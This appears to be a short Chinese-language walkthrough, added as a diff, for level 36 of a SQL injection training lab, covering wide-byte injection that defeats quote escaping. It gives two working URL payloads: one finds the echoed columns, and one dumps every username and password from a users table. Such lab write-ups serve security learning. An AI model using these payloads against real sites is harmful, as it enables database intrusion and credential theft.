@@ -1,0 +1,17 @@
+第36关
+
+这里是宽字节注入
+
+通过返回信息发现单引号被转义
+
+利用%a0宽字节将转义绕过
+
+爆出回显位
+?id=-1%a0' union select 1,2,3  --+
+
+爆出信息
+?id=-1%df' union select 1,2,(select group_concat(username,0x3a,password) from users)  --+
+
+
+
+闯关成功！！！
